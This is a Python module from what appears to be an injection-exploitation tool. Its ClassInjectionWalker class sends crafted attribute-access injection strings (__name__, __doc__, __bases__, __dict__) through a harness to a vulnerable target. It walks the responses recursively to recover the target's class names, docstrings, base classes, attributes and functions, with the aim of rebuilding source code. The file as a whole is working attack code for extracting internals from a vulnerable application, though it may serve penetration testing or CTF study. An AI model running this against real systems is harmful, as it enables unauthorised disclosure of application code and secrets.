"""Implementation of ClassInjectionWalker."""

from __future__ import annotations

from typing import (
    Iterator,
    List,
    Optional,
    Set)

from .abstract_injection_walker import (
    AbstractInjectionWalker)
from .attribute_injection_walker import (
    AttributeInjectionWalker)
from .doc_string_injection_walker import (
    DocStringInjectionWalker)
from .failed_injection_walker import (
    FailedInjectionWalker)
from .function_injection_walker import (
    FunctionInjectionWalker)
from .name_injection_walker import (
    NameInjectionWalker)
from ..utils import (
    parse_dict_top_level_keys)


class ClassInjectionWalker(AbstractInjectionWalker):
    """An injection walker for recovering class source code and other data."""

    INJECTION_RE = None
    RESPONSE_RE = r'<class .+>'

    def __extra_init__(
        self
    ) -> None:
        super().__extra_init__()
        self._raw_dict_str: Optional[str] = None

        self._docstring_walker: Optional[DocStringInjectionWalker] = None
        self._name_walker: Optional[NameInjectionWalker] = None
        self._base_class_walkers: List[ClassInjectionWalker] = []
        self._attribute_walkers: List[AttributeInjectionWalker] = []
        self._function_walkers: List[FunctionInjectionWalker] = []

        self._src_code: Optional[str] = None

    def walk(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        yield self

        yield from self._walk_name()
        yield from self._walk_doc()
        yield from self._walk_base_classes()
        yield from self._walk_dict()

        # TODO: build source code

    def _walk_name(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Recover the class's __name__."""
        name_injection = f'{self._injection_str}.__name__!r'
        result = self._harness.send_injection(name_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                f'Unable to read response from injection {name_injection}')
            return

        walker = self.next_walker(name_injection, result)
        if not isinstance(walker, NameInjectionWalker):
            yield FailedInjectionWalker.msg(
                f'Expected a name response when sending {name_injection}; '
                f'got {walker.__class__.__qualname__} instead')
            return

        yield from walker.walk()
        self._name_walker = walker

    def _walk_doc(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Recover the class's __doc__."""
        docstring_injection = f'{self._injection_str}.__doc__!r'
        result = self._harness.send_injection(docstring_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to retrieve injection response from string '
                f'{docstring_injection}')
            return

        walker = self.next_walker(docstring_injection, result)
        if not isinstance(walker, DocStringInjectionWalker):
            yield FailedInjectionWalker.msg(
                'Expected a docstring response when sending injection '
                f'{docstring_injection}; got '
                f'{walker.__class__.__qualname__} instead')
            return

        yield from walker.walk()
        self._docstring_walker = walker

    def _walk_base_classes(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Walk the class's base classes via __bases__."""
        base_classes_injection = f'{self._injection_str}.__bases__'
        result = self._harness.send_injection(base_classes_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to retrieve injection response from string '
                f'{base_classes_injection}')
            return

        i = 0
        while True:
            base_class_indexed_injection = (
                f'{self._injection_str}.__bases__[{i}]')
            result = self._harness.send_injection(base_class_indexed_injection)
            if result is None:
                break

            base_class_walker = self.next_walker(
                base_class_indexed_injection, result)
            if not isinstance(base_class_walker, ClassInjectionWalker):
                yield FailedInjectionWalker.msg(
                    'Expected class injection walker from response but got '
                    f'{base_class_walker.__class__.__qualname__} instead')
                return

            base_class_name_injection = (
                f'{base_class_indexed_injection}.__name__!r')
            result = self._harness.send_injection(base_class_name_injection)
            if result is None:
                break

            base_class_name_walker = self.next_walker(
                base_class_name_injection, result)
            if not isinstance(base_class_name_walker, NameInjectionWalker):
                yield FailedInjectionWalker.msg(
                    'Expected name injection walker from injection '
                    f'{base_class_name_injection} but got'
                    f'{base_class_name_walker.__class__.__qualname__} instead')
                return

            yield from base_class_name_walker.walk()

            base_class_name = base_class_name_walker.value
            if (base_class_name is None or
                    base_class_name in self._engine.base_class_blacklist):
                i += 1
                continue

            yield from base_class_walker.walk()
            self._base_class_walkers.append(base_class_walker)
            i += 1

    def _walk_dict(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Walk the class's attrs, funcs, and other fields via __dict__."""
        key_blacklist: Set[str] = set(self._engine.attribute_blacklist)
        # below fields are visited manually
        key_blacklist |= {'__name__', '__doc__', '__bases__', '__dict__'}

        dict_injection = f'{self._injection_str}.__dict__'
        result = self._harness.send_injection(dict_injection)
        if result is None:
            cls_name = self._namestring_walker.value
            name_desc = (f'class {cls_name}' if cls_name is not None
                         else 'injected class')
            yield FailedInjectionWalker.msg(
                f'Unable to recover __dict__ from {name_desc} with '
                f'injection {dict_injection}')
            return
        self._raw_dict_str = result

        # now that we have the top-level __dict__ keys, we will iterate over
        # them and inspect any interesting attributes that we get back
        top_level_keys = parse_dict_top_level_keys(self._raw_dict_str)
        for key in top_level_keys:
            if key in key_blacklist:
                continue

            injection_str = f'{self._injection_str}.{key}'
            result = self._harness.send_injection(injection_str)
            if result is None:
                yield FailedInjectionWalker.msg(
                    'Unable to read injection response with string '
                    f'{injection_str}')
                continue

            next_walker = self.next_walker(injection_str, result)
            if next_walker is None:
                yield FailedInjectionWalker.msg(
                    f'Unable to parse raw injection response {result} into '
                    'a defined injection walker type')
                continue

            if isinstance(next_walker, FunctionInjectionWalker):
                self._function_walkers.append(next_walker)
            elif isinstance(next_walker, AttributeInjectionWalker):
                self._attribute_walkers.append(next_walker)

            yield from next_walker.walk()

    @property
    def raw_dict_str(
        self
    ) -> str:
        """The raw __dict__ injection response for the injected class."""
        return self._raw_dict_str

    @property
    def docstring_walker(
        self
    ) -> Optional[DocStringInjectionWalker]:
        """The walker used to recover the injected class's docstring."""
        return self._docstring_walker

    @property
    def name_walker(
        self
    ) -> Optional[NameInjectionWalker]:
        """The walker used to recover the injected class's __name__."""
        return self._name_walker

    @property
    def base_class_walkers(
        self
    ) -> List[ClassInjectionWalker]:
        """The walkers used to enumerate this class's bases."""
        return self._base_class_walkers

    @property
    def attribute_walkers(
        self
    ) -> List[AttributeInjectionWalker]:
        """The walkers used to recover this class's attributes."""
        return self._attribute_walkers

    @property
    def function_walkers(
        self
    ) -> List[FunctionInjectionWalker]:
        """The walkers used to recover this class's functions."""
        return self._function_walkers

    @property
    def src_code(
        self
    ) -> Optional[str]:
        """The recovered source code from the injected class."""
        return self._src_code

    def __str__(
        self
    ) -> str:
        return f'Injected class with string {self._injection_str}'
